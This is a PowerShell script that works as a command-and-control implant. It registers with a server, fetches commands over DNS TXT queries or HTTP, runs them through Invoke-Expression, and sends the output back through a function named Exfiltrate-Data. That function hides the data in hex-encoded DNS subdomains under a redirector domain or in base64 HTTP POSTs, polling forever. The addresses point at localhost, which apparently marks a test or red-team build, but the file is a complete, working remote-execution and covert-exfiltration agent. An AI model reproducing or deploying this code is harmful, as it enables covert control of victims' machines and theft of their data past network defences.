$dnsAddr = "127.0.0.1"
$domain = "a.malgo-redirector.com"
$dnsChunkLength = 80 - $domain.Length
if ($dnsChunkLength % 2 -ne 0) { $dnsChunkLength -= 1 }

$httpAddr = "http://127.0.0.1:8088"
$httpChunkLength = 1024


$sessionId = "d8524193-809d-4f36-b65c-9a48ead7258e"
$projectId = "7c377f4f-7ad9-47c8-8315-4e36a665c595"

$chunkLengths = @{
    DNS  = $dnsChunkLength
    HTTP = $httpChunkLength
}

# Proportions of each channel, described as
# a relationship between the number of chunks
$proportions = @{
    DNS  = 1
    HTTP = 1
}

filter chunks {
    param (
        [Parameter(ValueFromPipeline = $true)]
        [String]$t,
        [Parameter(Mandatory = $true)]
        [hashtable]$ChunkLengths,
        [Parameter(Mandatory = $false)]
        [hashtable]$Proportions
    )

    $result = @()

    if ($null -eq $Proportions) {
        $Proportions = @{}
        $ChunkLengths.Keys | % { $Proportions[$_] = 1 }
    }
    
    # while ($t.Length -gt 0) {
    #     $name = $ChunkLengths.Keys | Get-Random
    #     $possibleLengths = $ChunkLengths[$name]
    #     Write-Host "Transport: $name"
    #     Write-Host "Possible Lengths: $possibleLengths"
    #     Write-Host "Data Length: $($t.Length)"
    #     $chunkSize = [math]::Min($t.Length, $possibleLengths)

    #     $chunk = $t.Substring(0, $chunkSize)
    #     $t = $t.Substring($chunkSize)

    #     $result += @{"name" = $name; "chunk" = $chunk }
    # }

    # proportions need to reflect the length of the data.
    # Right now they are just a ratio of the number of chunks
    $sum = $Proportions.Values | Measure-Object -Sum | Select-Object -ExpandProperty Sum
    $chunkLength = $t.Length / $sum
    # we need to make a copy so that Powershell does not complain
    $newProportions = @{}
    $Proportions.Keys | % {
        $name = $_
        $newProportions[$name] = [math]::Ceiling($Proportions[$name] * $chunkLength)
    }
    $Proportions = $newProportions

    while ($t.Length -gt 0) {
        $name = $Proportions.Keys | Get-Random
        Write-Host $Proportions.Keys
        $chunkSize = [math]::Min($t.Length, [math]::Min($ChunkLengths[$name], $Proportions[$name]))

        $chunk = $t.Substring(0, $chunkSize)
        $t = $t.Substring($chunkSize)
        $Proportions[$name] -= $chunkSize
        if ($Proportions[$name] -le 0) {
            $Proportions.Remove($name)
        }

        $result += @{"name" = $name; "chunk" = $chunk }
    }

    $result
}

# DNS Helper functions
filter thx { ($_.ToCharArray() | % { "{0:X2}" -f [int]$_ }) -join "" }
filter dots($c) { ($_ -replace "([\w]{$c})", "`$1.").trim('.') } 
function Get-Blob { return -join ((65..90) + (97..122) | Get-Random -Count 4 | % { [char]$_ }) }

# DNS Functions
function Register-Session-DNS {
    [CmdletBinding()]
    param (
        [Parameter()]
        [String]
        $sessionID,
        [Parameter()]
        [String]
        $projectID
    )
    $random = Get-Blob

    $queryString = "$projectID.$sessionID.$random.$domain"

    Resolve-DnsName -Name $queryString -Server $dnsAddr -Type AAAA
}

function Get-CommandInfo-DNS {
    $random = Get-Blob

    return (Resolve-DnsName -Name "$sessionId.$random.$domain" -Server $dnsAddr -Type TXT).Strings
}

function Get-CommandDetails-DNS {
    [CmdletBinding()]
    param (
        [Parameter()]
        [String]
        $commandID
    )
    $random = Get-Blob


    $currentOffset = 0
    $isFinished = $false
    $command = ""

    while (-not $isFinished) {
        [string]$stringOffset = $currentOffset 
        $queryString = "a.$stringOffset.$commandID.$random.$domain"
        $response = (Resolve-DnsName -Name $queryString -Server $dnsAddr -Type TXT).Strings

        $response = $response -join ""
        # decode response from base64
        $response = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response))

        $response = $response | ConvertFrom-Json

        Write-Host "Response: $response"

        $data = $response.data
        $isFinished = $response.is_last_chunk
        Write-Host "Is Finished: $isFinished"
        $currentOffset += $data.Length
        Write-Host "Current Offset: $currentOffset"
        $command += $data
    }

    return $command
}

function Set-ResultLength-DNS {
    [CmdletBinding()]
    param (
        [Parameter()]
        [String]
        $commandId,
        [Parameter()]
        [String]
        $data
    )

    $random = Get-Blob

    $result_length = $dataToSend.Length

    # send the length of the data
    $queryString = "a.$result_length.$commandId.$random.$domain"

    Write-Host $queryString

    Resolve-DnsName -Name $queryString -Server $dnsAddr -Type A
}

function Send-ResultChunk-DNS {
    [CmdletBinding()]
    param (
        [Parameter()]
        [String]
        $commandId,
        [Parameter()]
        [Int]
        $offset,
        [Parameter()]
        [String]
        $chunk
    )
    $random = Get-Blob

    # convert chunk to hex
    $chunk = $chunk | thx | dots 20

    [string]$stringOffset = $offset
    $queryString = "a.$chunk.$stringOffset.$commandId.$random.$domain"
    Resolve-DnsName -Name $queryString -Server $dnsAddr -Type A
}

# HTTP Functions
function Register-Session-HTTP {
    [CmdletBinding()]
    param (
        [Parameter()]
        [String]
        $sessionID,
        [Parameter()]
        [String]
        $projectID
    )
    Invoke-RestMethod -Uri "$httpAddr/$projectID/$sessionID" -Method PUT
}

function Get-CommandInfo-HTTP {
    (Invoke-WebRequest -UseBasicParsing -Uri "$httpAddr/s/$sessionId" -Method GET).Content
}

function Get-CommandDetails-HTTP {
    [CmdletBinding()]
    param (
        [Parameter()]
        [String]
        $commandID
    )

    $currentOffset = 0
    $isFinished = $false
    $command = ""

    while (-not $isFinished) {
        [string]$stringOffset = $currentOffset
        $response = Invoke-RestMethod -Uri "$httpAddr/c/$commandID/$currentOffset" -Method GET

        #        $response = $response -join ""
        # decode response from base64
        $response = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response))

        $response = $response | ConvertFrom-Json

        Write-Host "Response: $response"

        $data = $response.data
        $isFinished = $response.is_last_chunk
        Write-Host "Is Finished: $isFinished"
        $currentOffset += $data.Length
        Write-Host "Current Offset: $currentOffset"
        $command += $data
    }

    return $command
}

function Set-ResultLength-HTTP {
    [CmdletBinding()]
    param (
        [Parameter()]
        [String]
        $commandId,
        [Parameter()]
        [String]
        $data
    )

    $dataToSend = $data | Out-String

    $result_length = $dataToSend.Length

    # send the length of the data
    Invoke-RestMethod -Uri "$httpAddr/c/$commandId/$result_length" -Method PATCH
}

function Send-ResultChunk-HTTP {
    [CmdletBinding()]
    param (
        [Parameter()]
        [String]
        $commandId,
        [Parameter()]
        [Int]
        $offset,
        [Parameter()]
        [String]
        $chunk
    )

    $payload = ([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($chunk)))
    Invoke-WebRequest -UseBasicParsing -Uri "$httpAddr/c/$commandId/$offset" -Method POST -Body "$payload"
}

# Main Functions
function Register-Session {
    # randomly select a communication channel
    $channel = Get-Random -InputObject $chunkLengths.Keys

    if ($channel -eq "DNS") {
        Register-Session-DNS -sessionID $sessionId -projectID $projectId
    }
    elseif ($channel -eq "HTTP") {
        Register-Session-HTTP -sessionID $sessionId -projectID $projectId
    }
    else {
        Write-Host "Unknown channel: $channel"
        Exit
    }
}

function Get-CommandInfo {
    $channel = Get-Random -InputObject $chunkLengths.Keys

    if ($channel -eq "DNS") {
        return Get-CommandInfo-DNS
    }
    elseif ($channel -eq "HTTP") {
        return Get-CommandInfo-HTTP
    }
    else {
        Write-Host "Unknown channel: $channel"
        Exit
    }
}

function Get-CommandDetails {
    [CmdletBinding()]
    param (
        [Parameter()]
        [String]
        $commandID
    )

    $channel = Get-Random -InputObject $chunkLengths.Keys

    if ($channel -eq "DNS") {
        return Get-CommandDetails-DNS -commandID $commandID
    }
    elseif ($channel -eq "HTTP") {
        return Get-CommandDetails-HTTP -commandID $commandID
    }
    else {
        Write-Host "Unknown channel: $channel"
        Exit
    }
}

function Set-ResultLength {
    [CmdletBinding()]
    param (
        [Parameter()]
        [String]
        $commandId,
        [Parameter()]
        [String]
        $data
    )

    $channel = Get-Random -InputObject $chunkLengths.Keys

    if ($channel -eq "DNS") {
        Set-ResultLength-DNS -commandId $commandId -data $data
    }
    elseif ($channel -eq "HTTP") {
        Set-ResultLength-HTTP -commandId $commandId -data $data
    }
    else {
        Write-Host "Unknown channel: $channel"
        Exit
    }
}

function Send-ResultChunk {
    [CmdletBinding()]
    param (
        [Parameter()]
        [String]
        $channel,
        [Parameter()]
        [String]
        $commandId,
        [Parameter()]
        [Int]
        $offset,
        [Parameter()]
        [String]
        $chunk
    )

    if ($channel -eq "DNS") {
        Send-ResultChunk-DNS -commandId $commandId -offset $offset -chunk $chunk
    }
    elseif ($channel -eq "HTTP") {
        Send-ResultChunk-HTTP -commandId $commandId -offset $offset -chunk $chunk
    }
    else {
        Write-Host "Unknown channel: $channel"
        Exit
    }
}

function Exfiltrate-Data {
    [CmdletBinding()]
    param (
        [Parameter()]
        [String]
        $commandId,
        [Parameter()]
        [String]
        $data
    )

    $dataToSend = $data | Out-String

    $offset = 0

    Write-Host "Setting result length to: $($dataToSend.Length)"
    Set-ResultLength -commandId $commandId -data $dataToSend

    $chunks = $dataToSend | chunks -ChunkLengths $chunkLengths -Proportions $proportions

    foreach ($chunk in $chunks) {
        Send-ResultChunk -channel $chunk.name -commandId $commandId -offset $offset -chunk $chunk.chunk
        $offset += $chunk.chunk.Length
    }
}

Register-Session -sessionID $sessionId -projectID $projectId
while ($true) {
    $cmd = Get-CommandInfo
    if ($cmd -eq "null" -or $cmd -eq "") {
        Write-Host "No command found"
    }
    else {
        $cmdInfo = $cmd | ConvertFrom-Json

        $command = Get-CommandDetails -commandID $cmdInfo.command_id
        Write-Host "Command: $command"

        $response = Invoke-Expression $command | Out-String
        Write-Host "Response: $response"

        Exfiltrate-Data -commandId $cmdInfo.command_id -data $response
    }

    Write-Host "Sleeping for 1 second"
    Start-Sleep -Seconds 1
}